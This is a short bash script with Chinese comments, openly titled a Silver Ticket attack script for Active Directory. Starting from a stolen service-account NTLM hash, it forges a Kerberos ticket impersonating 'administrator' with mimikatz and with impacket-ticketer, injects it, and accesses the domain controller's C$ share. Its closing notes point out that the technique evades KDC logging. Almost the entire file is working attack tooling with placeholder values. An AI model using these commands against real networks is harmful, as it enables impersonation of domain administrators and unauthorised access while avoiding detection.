#!/bin/bash
# 白银票据 Silver Ticket 攻击脚本
# 前提：已获取目标服务账户的 NTLM 哈希

DOMAIN="corp.local"
DOMAIN_SID="S-1-5-21-1234567890-1234567890-1234567890"
TARGET_HOST="DC01.corp.local"
SERVICE="cifs"                   # cifs/http/mssql/host/ldap
SERVICE_HASH="deadbeefdeadbeefdeadbeefdeadbeef"  # 服务账户 NTLM 哈希
TARGET_USER="administrator"

echo "[*] 方式一：使用 mimikatz 伪造白银票据"
cat << 'EOF'
# 在 mimikatz 中执行：
kerberos::silver \
    /user:${TARGET_USER} \
    /domain:${DOMAIN} \
    /sid:${DOMAIN_SID} \
    /target:${TARGET_HOST} \
    /service:${SERVICE} \
    /rc4:${SERVICE_HASH} \
    /ticket:silver.kirbi

# 注入票据
kerberos::ptt silver.kirbi

# 访问目标服务（以 CIFS 为例）
dir \\DC01\C$
EOF

echo ""
echo "[*] 方式二：使用 impacket 伪造白银票据"
impacket-ticketer \
    -nthash ${SERVICE_HASH} \
    -domain-sid ${DOMAIN_SID} \
    -domain ${DOMAIN} \
    -spn ${SERVICE}/${TARGET_HOST} \
    ${TARGET_USER}

echo ""
echo "[*] 白银票据特点："
echo "    - 无需与 KDC 通信，完全离线伪造"
echo "    - 仅对特定服务有效（比黄金票据权限小）"
echo "    - 更难被检测（不经过 KDC 日志）"
